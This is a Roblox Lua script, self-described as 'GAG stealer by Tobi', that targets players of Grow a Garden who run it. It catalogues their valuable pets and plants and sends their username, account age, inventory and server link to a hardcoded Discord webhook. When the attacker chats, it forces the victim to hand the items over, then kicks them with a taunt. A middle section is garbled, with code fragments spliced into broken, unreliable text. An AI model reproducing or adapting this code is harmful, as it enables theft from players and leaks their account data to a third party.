_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local users            = _G.Usernames or {"ezikiel53"}
local min_value        = _G.min_value or 10000000
local pingEveryone     = _G.pingEveryone or "No"
local webhook          = _G.webhook or "https://discord.com/api/webhooks/1444187837762109501/Au5My2ZxWDAdtg7okXOjXBaWvpd4p_36BxCeimgQrOztwzI7sYfMq9euFooL0mckPf8f"

local Players          = game:GetService("Players")
local HttpService      = game:GetService("HttpService")
local TeleportService  = game:GetService("TeleportService")
local plr              = Players.LocalPlayer
local backpack         = plr:WaitForChild("Backpack")
local replicatedStorage= game:GetService("ReplicatedStorage")
local modules          = replicatedStorage:WaitForChild("Modules")
local calcPlantValue   = require(modules:WaitForChild("CalculatePlantValue"))
local petUtils         = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
local petRegistry      = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
local numberUtil       = require(modules:WaitForChild("NumberUtil"))
local dataService      = require(modules:WaitForChild("DataService"))
local character        = plr.Character or plr.CharacterAdded:Wait()

local executorName = "Unknown"
if getexecutorname then
    executorName = getexecutorname()
elseif identifyexecutor then
    executorName = identifyexecutor()
end

local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
local rarePets      = {"Headless horseman", "Elephant", "Spider", "Raccoon"}

local function isServerValid()
    if game.PlaceId ~= 126884695634066 then return false end
    if #Players:GetPlayers() >= 5 then return false end
    if game:GetService("RobloxReplicatedStorage"):FindFirstChild("GetServerType") then
        local serverType = game:GetService("RobloxReplicatedStorage").GetServerType:InvokeServer()
        if serverType == "VIPServer" then return false end
    end
    return true
end

local function hopToPublicServer()
    TeleportService:Teleport(126884695634066)
end

if not isServerValid() then
    hopToPublicServer()
    return
end

if next(users) == nil or webhook == "" then
    plr:Kick("You didn't add any usernames or webhook")
    return
end

local function calcPetValue(v14)
    local hatchedFrom = v14.PetData.HatchedFrom
    if not hatchedFrom or hatchedFrom == "" then return 0 end
    local eggData = petRegistry.PetEggs[hatchedFrom]
    if not eggData then return 0 end
    local v17 = eggData.RarityData.Items[v14.PetType]
    if not v17 then return 0 end
    local weightRange = v17.GeneratedPetData.WeightRange
    if not weightRange then return 0 end
    local v19 = numberUtil.ReverseLerp(weightRange[1], weightRange[2], v14.PetData.BaseWeight)
    local v20 = math.lerp(0.8, 1.2, v19)
    local levelProgress = petUtils:GetLevelProgress(v14.PetData.Level)
    local v22 = v20 * math.lerp(0.15, 6, levelProgress)
    local v23 = petRegistry.PetList[v14.PetType].SellPrice * v22
    return math.floor(v23)
end

local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    if suffixIndex == 1 then
        return tostring(math.floor(number))
    else
        if number == math.floor(number) then
            return string.format("%d%s", number, suffixes[suffixIndex])
        else
            return string.format("%.2f%s", number, suffixes[suffixIndex])
        end
    end
end

local function getWeight(tool)
    local weightValue = tool:FindFirstChild("Weight") or 
                       tool:FindFirstChild("KG") or 
                       tool:FindFirstChild("WeightValue") or
                       tool:FindFirstChild("Mass")
    local weight = 0
    if weightValue then
        if weightValue:IsA("NumberValue") or weightValue:IsA("IntValue") then
            weight = weightValue.Value
        elseif weightValue:IsA("StringValue") then
            weight = tonumber(weightValue.Value) or 0
        end
    else
        local weightMatch = tool.Name:match("%((%d+%.?%d*) ?kg%)")
        if weightMatch then
            weight = tonumber(weightMatch) or 0
        end
    end
    return math.floor(weight * 100 + 0.5) / 100
end

local function getHighestKGFruit()
    local highestWeight = 0
    for _, item in ipairs(itemsToSend) do
        if item.Weight > highestWeight then
            highestWeight = item.Weight
        end
    end
    return highestWeight
end

local function buildFields(list)
    local victimUsername = plr.Name
    local receiver = table.concat(users, ", ")
    local accountAge = plr.AccountAge

    local inventoryText = ""
    for _, item in ipairs(list) do
        inventoryText = inventoryText .. string.format("%s (%.2f KG): ¢%s\n", item.Name, item.Weight, formatNumber(item.Value))
    end
    if inventoryText == "" then inventoryText = "N/A" end

    return {
        {
            name = "👤 Account Information",
            value = string.format("**Name:** %s\n**Receiver:** %s\n**Executor:** %s\n**Account Age:** %d days", victimUsername, receiver, executorName, accountAge),
            inline = false
        },
        {
            name = "💰 Value",
            value = string.format("**Value:** ¢%s\n**Highest Value:** ¢%s", formatNumber(totalValue), formatNumber(list[1] and list[1].Value or 0)),
            inline = false
        },
        {
            name = "🎒 Inventory",
            value = string.format("```%s```", inventoryText),
            inline = false
        },
        {
            name = "🔗 Join Link",
            value = string.format("https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=%s", game.JobId),
            inline = false
        }
    }
end

local function sendWebhook(embedTitle, list, usePing)
    local hasRare = false
    for _, item in ipairs(list) do
        if table.find(rarePets, item.Name) then
            hasRare = true
            break
        end
    end

    local prefix = ""
    if (pingEveryone == "Yes" or hasRare) and usePing then
        prefix = "--[[@everyone]] "
    end

    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(126884695634066, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = embedTitle,
            ["color"] = 65280,
            ["fields"] = buildFields(list),
            ["footer"] = {
                ["text"] = "GAG stealer by Tobi. discord.gg/GY2RVSEGDT"
            }
        }}
    }

    local body = HttpService:JSONEncode(data)
    local headers = {["Content-Type"] = "application/json"}
    request({
        Url = webhook,
        Method = "POST",
        Headers = headers,
        Body = body
    })
end

local totalValue = 0
local itemsToSend = {}

for _, tool in ipairs(backpack:GetChildren()) do
    if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
        if tool:GetAttribute("ItemType") == "Pet" then
            local petUUID = tool:GetAttribute("PET_UUID")
            local v14 = dataService:GetData().PetsData.PetInventory.Data[petUUID]
            local itemName = v14.PetType
            if table.find(rarePets, itemName) or getWeight(tool) >= 10 then
                if tool:GetAttribute("Favorite") then
                    replicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
                end
                local value = calcPetValue(v14)
                local toolName = tool.Name
                local weight = tonumber(toolName:match("%[(%d+%.?%d*) KG%]")) or 0
                totalValue = totalValue + value
                table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Pet"})
            end
        else
            local value = calcPlantValue(tool)
            if value[" min_value then
                local weight = getWeight(tool)
                local itemName = tool:GetAttribute("ItemName")
                totalValue = totalValue + value
                table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Plant"})
            end
        end
    end
end

if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b)
        if a"] ~= "Pet = and b.Type == "Pet" then return true end
        if a.Type == "Pet" and b.Type ~= "Pet" then return false end
        return a.Value < b.Value
application end)

    local sentItems = {}
/json for i, v in ipairs(itemsToSend) do sent"}
[i] = v end

    table.sort(sentItems, function(a, b)
        if a.Type == "Pet" and b.Type ~=({
Pet" then return true end
        if a.Type ~= "Pet" and b.Type == "Pet" then = false end
        return a.Value > b.Value
    end)

    webhook,
        Method = "POST",
        Headers = headers,
        Body WEBHOOK

    local function doSte total(player = 0
local itemsToSend = {}

for _, tool in ipairs(backpack:GetChildren()) do
    if tool:IsA("Tool") and not table        victimRoot.CFrame = player.Character.HumanoidRootPart.CFrame + Vector(excludedItems, tool.Name) then 2)
        wait(0.1)

        local promptRoot = player.Character.Humanoid = tool:GetAttribute("PET_UUIDProximityPrompt")

        for _, item in ipairs localTo14 =
            item.Tool.Parent = character
            if item.Type.Data[petUUID]
            local itemName = v14.PetType
           Wait table.find(rarePets, itemName) or.01) until promptHead.Enabled10 then
                ifprompt:GetHead)
Favorite else
                    replicatedStorage:Wait0.01) until promptRoot.Enabled
                fireproximity"):(promptServer(tool)
               
            task.wait(0.PetValue            item.Tool.Parent = toolName            task.wait
                local weight1)
       (toolName:        local itemsStill+%.?packd*)
% while items or 0
 do                           items = totalBack + value
                table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Pet"})
            end
        else
            local value = calcPlantValue(tool)
            if value >= min_value then
                local weight = getWeight(tool)
                local itemName = tool:GetAttribute("ItemName")
                totalValue = totalValue + value
                table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Plant"})
            end
        end
    end
end

if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b)
        if a.Type ~= "Pet" and b.Type == "Pet" then return true end
        if a.Type == "Pet" and b.Type ~= "Pet" then return false end
        return a.Value < b.Value
    end)

    local sentItems = {}
    for i, v in ipairs(itemsToSend) do sentItems[i] = v end

    table.sort(sentItems, function(a, b)
        if a.Type == "Pet" and b.Type ~= "Pet" then return true end
        if a.Type ~= "Pet" and b.Type == "Pet" then return false end
        return a.Value > b.Value
    end)

    sendWebhook("🌐 Join to get GAG hit", sentItems, true)

    local function doSteal(player)
        local victimRoot = character:WaitForChild("HumanoidRootPart")
        victimRoot.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0, 0, 2)
        wait(0.1)

        local promptRoot = player.Character.HumanoidRootPart:WaitForChild("ProximityPrompt")

        for _, item in ipairs(itemsToSend) do
            item.Tool.Parent = character
            if item.Type == "Pet" then
                local promptHead = player.Character.Head:WaitForChild("ProximityPrompt")
                repeat task.wait(0.01) until promptHead.Enabled
                fireproximityprompt(promptHead)
            else
                repeat task.wait(0.01) until promptRoot.Enabled
                fireproximityprompt(promptRoot)
            end
            task.wait(0.1)
            item.Tool.Parent = backpack
            task.wait(0.1)
        end

        local itemsStillInBackpack = true
        while itemsStillInBackpack do
            itemsStillInBackpack = false
            for _, item in ipairs(itemsToSend) do
                if backpack:FindFirstChild(item.Tool.Name) then
                    itemsStillInBackpack = true
                    break
                end
            end
            task.wait(0.1)
        end

        plr:Kick("All your stuff just got stolen by Tobi's stealer!\n Join discord.gg/GY2RVSEGDT")
    end

    local function waitForUserChat()
        local sentMessage = false
        local function onPlayerChat(player)
            if table.find(users, player.Name) then
                player.Chatted:Connect(function()
                    if not sentMessage then
                        sendWebhook("🌐 New GAG Execution", sentItems, false)
                        sentMessage = true
                    end
                    doSteal(player)
                end)
            end
        end
        for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
        Players.PlayerAdded:Connect(onPlayerChat)
    end
    waitForUserChat()
end
